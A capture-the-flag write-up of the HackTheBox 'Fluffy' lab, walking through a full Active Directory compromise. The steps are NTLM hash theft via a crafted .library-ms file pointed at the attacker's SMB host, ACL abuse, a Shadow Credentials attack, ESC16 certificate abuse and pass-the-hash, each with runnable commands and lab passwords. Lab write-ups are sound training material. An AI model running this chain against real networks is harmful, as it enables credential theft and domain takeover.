+++
date = '2026-07-10T18:20:42+02:00'
draft = false
title = 'Fluffy Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`11/08/2025`**

![Fluffy.png](/images/imgs_fluffy/Fluffy.png)

---
# Introduction

**_Fluffy_** is an **Easy-level Active Directory** environment from **HackTheBox** that showcases a modern attack chain, heavily focused on **Active Directory ACL** abuses and **Certificate Services**.

This is an assumed breached box that starts with valid credentials for a low-privileged user, allowing enumeration of the domain via **BloodHound**. After identifying a possible permission path, I used an **NTLM Theft** attack on a writable **SMB** share to capture and crack the hash of a higher-privileged user.
With the new account, I abused **`GenericAll`** and **`GenericWrite`** permissions to escalate privileges laterally. Finally, I targeted a high-value service account using a **Shadow Credential Attack**, and abused an **AD CS** (**Active Directory Certificate Services**) misconfiguration to extract the **Domain Administrator**'s hash and achieve full domain compromise.

---
# Techniques Used

- **Harvesting & BloodHound Enumeration**

- **NTLM Hash Capture (NTLM Theft)**

- **Shadow Credential Attack**

- **AD CS Exploitation (ESC16)** 

- **Pass-The-Hash**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- fluffy -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49689/tcp open  unknown
49690/tcp open  unknown
49700/tcp open  unknown
49706/tcp open  unknown
49717/tcp open  unknown
49736/tcp open  unknown
```

Targeted scan with script and service detection:

```bash
nmap -sC -sV fluffy -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-10 15:55:11Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
|_ssl-date: 2026-07-10T15:56:32+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-10T15:56:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-10T15:56:32+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-10T15:56:31+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Not valid before: 2026-04-30T16:09:59
|_Not valid after:  2106-04-30T16:09:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-10T15:55:52
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

The scans revealed a standard set of **Active Directory** ports (**DNS, Kerberos, LDAP, SMB, WinRM**). 

I added **`fluffy.htb`** and **`dc01.fluffy.htb`** to my **`/etc/hosts`** file.

## Credentials Validation & SMB Enumeration

Since this is an assumed breached box, I checked the validity of the provided credentials (**`j.fleischman:J0elTHEM4n1990!`**) against **WinRM** and **SMB** using **NetExec**:

```bash
nxc winrm fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
```

![winrmfail.png](/images/imgs_fluffy/winrmfail.png)

```bash
nxc smb fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --shares
```

![smb.png](/images/imgs_fluffy/smb.png)

The output revealed access to the **`IT`** share.

# Initial Access & Lateral Movement | BloodHound & NTLM Theft

Initially, to map out the domain, I collected **Active Directory** data using **BloodHound**:

```bash
bloodhound-python -u j.fleischman -p 'J0elTHEM4n1990!' -ns 10.129.232.88 -d 'fluffy.htb' -c all --zip
```

![harvesting.png](/images/imgs_fluffy/harvesting.png)

Reviewing the **BloodHound GUI**, I analyzed the users and a bunch of service accounts. I found a possible path involving two users: **`j.coffe`** and **`p.agila`**. Both belong to the **`Service Account Manager`** group.

![2users.png](/images/imgs_fluffy/2users.png)

This group has **`GenericAll`** privileges over the **`service accounts`** group, which in turn has **`GenericWrite`** over three specific service accounts. I realized that if I could compromise **`p.agila`** or **`j.coffe`**, I could control those service accounts.

![hound1.png](/images/imgs_fluffy/hound1.png)

![hound2.png](/images/imgs_fluffy/hound2.png)

## NTLM Theft

So, I went back to **SMB** enumeration and I connected to the **`IT`** share using **smbclient**:

```bash
smbclient \\\\fluffy.htb\\IT -U j.fleischman
```

Inside, I found a bunch of files and a specific **`.pdf`** which I downloaded.

It revealed a **Patch Announcement** addressed to the **IT Department** regarding mandatory critical updates. The document lists multiple recent vulnerabilities, explicitly highlighting **CVE-2025-24071** as a **Critical** severity issue. It also instructs all administrators to schedule a maintenance timeslot.

**Note**: _**CVE-2025-24071** refers to a **spoofing** and **information disclosure** vulnerability in **Windows File Explorer**. Specifically, it exploits the trust **Explorer** places in **`.library-ms`**, **`.scf`**, or **`.url`** files (In this specific case **`.library-ms`**). When a user simply browses a directory containing that crafted file, **Explorer** automatically parses it to retrieve metadata. By pointing this metadata request to a rogue **SMB** server, we force the victim's machine to initiate an automatic outbound authentication request, effectively leaking their **NetNTLMv2** hash without requiring them to click or open the file._

![cve.png](/images/imgs_fluffy/cve.png)

Now, knowing I had write access to the **IT SMB** share, and knowing that **IT administrators** would likely be interacting with this directory to coordinate the patching process, I decided to set up an **NTLM Theft attack** to capture their hashes.

I generated the malicious file using **Greenwolf**'s tool:

- **https://github.com/Greenwolf/ntlm_theft**

```bash
python3 -m venv venv

source venv/bin/activate

pip3 install xlsxwriter

python3 ntlm_theft.py -g libraryms -s 10.10.6.77 -f stars
```

I started **Responder** on my **VPN** interface:

```bash
sudo responder -I tun0
```

Then, I connected back to the **`IT`** share and uploaded the generated payload:

```bash
smbclient \\\\fluffy.htb\\IT -U j.fleischman
mput stars.library-ms
```

![upload.png](/images/imgs_fluffy/upload.png)

Shortly after, user **`p.agila`** navigated the share, and **Responder** caught it's **NetNTLMv2**.

![ntlmtheft.png](/images/imgs_fluffy/ntlmtheft.png)

I cracked the hash using **John The Ripper**:

```bash
john hash --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt
```

![cracked.png](/images/imgs_fluffy/cracked.png)

---
# Privilege Escalation | ACL Abuse, Shadow Credentials & AD CS

Now authenticated as **`p.agila`**, I could abuse the previously discovered **ACL** path. Since **`p.agila`** is in the **`Service Account Manager`** group (which has **`GenericAll`** over **`service accounts`**), I added it directly to that specific group using **net rpc** following **Bloodhound**'s provided guide:

```bash
net rpc group addmem "service accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

I verified the group membership to ensure the command succeeded:

```bash
net rpc group members "service accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

![added.png](/images/imgs_fluffy/added.png)

Because the **`service accounts`** group has **`GenericWrite`** over three target accounts, I checked **BloodHound** to find the most valuable one. I discovered that **`ca_svc`** was a member of the **`Cert Publishers`** group.

![certgroup.png](/images/imgs_fluffy/certgroup.png)

## Shadow Credential Attack

**Note**: _Having **`GenericWrite`** over an account allows us to modify its **`msDS-KeyCredentialLink`** attribute. By writing our own public key into this attribute, we can request a **Ticket Granting Ticket** (**TGT**) for the target account and extract its **NT Hash**._

I used **certipy-ad** to automatically perform the **Shadow Credential attack** against **`ca_svc`** (**Chaining a bunch of commands to syncing the time with the DC to avoid Kerberos clock skew errors**):

```bash
sudo systemctl stop systemd-timesyncd && sudo rdate -n fluffy.htb && sudo ntpdate fluffy.htb && certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

![ca_svcH.png](/images/imgs_fluffy/ca_svcH.png)

This successfully retrieved the **NT hash** for the **`ca_svc`** account.

## AD CS Exploitation (ESC16)

With control over **`ca_svc`**, I checked for **vulnerable certificate templates** using **certipy-ad**:

```bash
sudo ntpdate fluffy.htb && certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.232.88 -vulnerable
```

![ca.png](/images/imgs_fluffy/ca.png)

The output indicated the environment was vulnerable to **`ESC16`**, an attack involving **UPN** manipulation.

![vuln.png](/images/imgs_fluffy/vuln.png)

**Note**: _Since we have write privileges over the **`ca_svc`** account itself, we can temporarily change its **User Principal Name** to match the **Domain Administrator**'s **UPN**. We can then request a certificate. The **CA** will issue a certificate binding to the requested **UPN**, effectively giving us a certificate valid for the **Administrator** account._ 

_**After requesting it, we must revert the UPN to avoid breaking the environment**._

- **Step 1**: I updated the **UPN** of the **`ca_svc`** account to **administrator**:

```bash
sudo ntpdate fluffy.htb && certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -user ca_svc -upn administrator update -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

![update.png](/images/imgs_fluffy/update.png)

- **Step 2**: I requested a certificate using the **User template**:

```bash
sudo ntpdate fluffy.htb && certipy-ad req -u ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

![request.png](/images/imgs_fluffy/request.png)

- **Step 3**: I reverted the **UPN** back to its original state to keep the environment stable:

```bash
sudo ntpdate fluffy.htb && certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -user ca_svc -upn ca_svc update -dc-ip 10.129.232.88 -dc-host 10.129.232.88
```

- **Step 4**: Using the obtained **`.pfx`** certificate, I authenticated to the **Domain Controller** to extract the **Administrator**'s **NT hash**:

```bash
sudo ntpdate fluffy.htb && certipy-ad auth -dc-ip 10.129.232.88 -pfx administrator.pfx -username administrator -domain fluffy.htb
```

![adminhash.png](/images/imgs_fluffy/adminhash.png)

## Full System Compromise | Pass-The-Hash

I validated the **NT Hash** it using **NetExec**:

```bash
nxc winrm fluffy.htb -u administrator -H '8d<REDACTED>6e'
```

It returned **`(Pwn3d!)`**. I then logged in using **Evil-WinRM**:

```bash
evil-winrm -i fluffy.htb -u administrator -H '8d<REDACTED>6e'
```

![systemproof.png](/images/imgs_fluffy/systemproof.png)

The root flag was located in **`C:\Users\Administrator\Desktop\`**

The user flag was located in **`C:\Users\winrm_svc\Desktop`**

---
# Final Thoughts

**_Fluffy_** is generally rated as a **Medium-level** environment. I personally found it leaning towards **Easy** because the kill chain itself isn't overly complex, but it definitely requires extreme precision and attention to detail at every step.
For example, I’ve read about many people getting stuck during the **ESC16** exploitation because they forget to revert the **UPN** back to its original state (causing conflicts in the environment), or they struggle with **Kerberos clock skew errors** because they didn't sync their time with the **Domain Controller** beforehand (or they apparently can't do it).

**Sources**:

- **NTLM Theft (Greenwolf) | https://github.com/Greenwolf/ntlm_theft**